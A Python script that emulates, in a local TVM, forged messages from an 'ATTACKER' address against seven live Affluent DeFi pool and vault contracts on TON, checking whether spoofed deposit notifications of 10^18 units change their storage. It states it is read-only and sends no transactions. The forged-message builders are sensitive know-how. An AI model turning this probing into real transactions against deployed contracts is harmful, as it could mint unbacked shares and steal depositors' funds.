#!/usr/bin/env python3
"""
Generic Affluent local-TVM storage-mutation tester.
READ-ONLY (lite-server reads + local TVM). No tx signed/sent.

For each (target, body) pair: emulate the inbound internal message against the
live account state and report whether the account's storage (data) cell changed.
A share-accounting "unbacked mint" would require a storage write.
"""
import base64, json, sys
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account, ShardAccount

ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"

TARGETS = {
    "BasicPool":          "EQCrEHHG4Ff8TD3PzuH5tFSwHBD3zxeXaosz48jGLebwiiNx",
    "LV_factorialTON":    "EQADQ6JcK0NMuNM5uwCcS9bjcn2RTvcxYIZjNlhIhywUrfBN",
    "LV_factorialUSDT":   "EQAGtgnr1G0XDilGURcOB3pUhl-Lo__J-TaJP0K4ey8cuSaW",
    "LV_affluentUSDT":    "EQAc65JgiTwcoC3M1VYnQcM2Ivq4DTWOtyY2k2EaBuXsKRAZ",
    "MV2_ton1":           "EQDtxQqkgIRQQR5hWlrQxiJMtLwjR3rEYNUBbEcvPDwCs1Ng",
    "MV2_usdt1":          "EQBzSItiC1vpDUEftDeWDyjgMutf6CIzme16gzn9iNlolpcY",
    "MV2_sentoraWallet":  "EQD5O4qzJmVwuKDIfDcuM6HI7fUf1AOolgF2oiPGyqr_WZsp",
}

def coins(b, v):
    if v == 0: b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)

def _data(acc):
    if acc is None or not hasattr(acc, "storage"): return None
    stt = acc.storage.state
    if not hasattr(stt, "x"): return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)

def data_of_account(cell):   return _data(Account().cell_unpack(cell, rec_unpack=True))
def data_of_shard(cell):
    sa = ShardAccount().cell_unpack(cell, rec_unpack=True)
    return _data(sa.account if sa is not None else None)

def body_notify(qid, amount, sender, fwd=None):
    b = CellBuilder(); b.store_uint(0x7362d09c, 32); b.store_uint(qid, 64); coins(b, amount)
    b.store_address(Address(sender))
    if fwd is None: b.store_bool(False)
    else: b.store_bool(True); b.store_ref(fwd)
    return b.end_cell()

def body_provide_deposit(qid, asset_addr, from_addr, amount, fwd=None):
    # provide_aggregated_data#b0c69ffe query_id:uint64 asset_requests:(Maybe ^Cell)
    # pool_requests:(Maybe ^Cell) vault_requests:(Maybe ^Cell) context_payload:DepositContext
    # DepositContext = deposit_context#f9471134 asset_address:MsgAddress from_address:MsgAddress
    #                 amount:Coins forward_ton_amount:Coins forward_payload:(Maybe ^Cell)
    b = CellBuilder(); b.store_uint(0xb0c69ffe, 32); b.store_uint(qid, 64)
    b.store_bool(False); b.store_bool(False); b.store_bool(False)   # 3 Maybe ^Cell = none
    b.store_uint(0xf9471134, 32)
    b.store_address(Address(asset_addr)); b.store_address(Address(from_addr))
    coins(b, amount); coins(b, 0); b.store_bool(False)
    return b.end_cell()

def body_provide_withdraw(qid, asset_addr, from_addr, amount, fwd=None):
    b = CellBuilder(); b.store_uint(0xb0c69ffe, 32); b.store_uint(qid, 64)
    b.store_bool(False); b.store_bool(False); b.store_bool(False)
    b.store_uint(0xcb03bfaf, 32)
    b.store_address(Address(asset_addr)); b.store_address(Address(from_addr))
    coins(b, amount); coins(b, 0); b.store_bool(False)
    return b.end_cell()

def build_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()

def main():
    lc = LiteClient(mode="roundrobin", timeout=3, num_try=5)
    blk = lc.get_masterchain_info_ext().last; now = lc.get_time()
    _, cfgraw = lc.get_config_all(blk)
    cfg = VmDict(32)
    for k, cs in cfgraw.get_iter():
        if k != 43: cfg.set(k, cs)

    combos = []
    for name, addr in TARGETS.items():
        combos.append((f"{name}::notify_1e18", name, addr,
                       lambda a: body_notify(1, 10**18, ATTACKER)))
        combos.append((f"{name}::provide_dep_1e18", name, addr,
                       lambda a: body_provide_deposit(1, a, ATTACKER, 10**18)))
    # a couple of extra withdraw-shaped calls
    for name in ("LV_factorialTON", "MV2_ton1"):
        addr = TARGETS[name]
        combos.append((f"{name}::provide_wd_1e18", name, addr,
                       lambda a: body_provide_withdraw(1, a, ATTACKER, 10**18)))

    res = {}
    for tag, name, addr, mk in combos:
        try:
            st = lc.get_account_state(Address(addr), blk)
        except Exception as e:
            print(f"[{tag}] account read err {e!r}"); continue
        lt = st.last_trans_lt + 1
        ss = st.to_shard_state()
        db = data_of_account(ss.begin_parse().load_ref())
        if db is None:
            print(f"[{tag}] no data cell (uninit?)"); res[tag] = {"error": "no data"}; continue
        hb = db.get_hash()
        body = mk(addr)
        msg = build_msg(ATTACKER, addr, 1_500_000_000, body, lt, now)
        em = Emulator(cfg); em.set_ignore_chksig(True)
        try:
            ok = em.emulate_transaction(ss, msg, now, lt)
        except Exception as e:
            print(f"[{tag}] ERR {e!r}"); res[tag] = {"error": repr(e)}; continue
        da = data_of_shard(em.account.to_cell())
        ha = da.get_hash() if da is not None else "None"
        changed = ha != hb
        print(f"[{tag}] ok={ok} data_changed={changed} before={hb[:12]} after={ha[:12]}")
        res[tag] = {"ok": ok, "data_changed": changed, "before": hb, "after": ha}
    json.dump(res, open("/tmp/opencode/aff/emu_targets_results.json", "w"), indent=1)
    print("DONE")

if __name__ == "__main__":
    main()
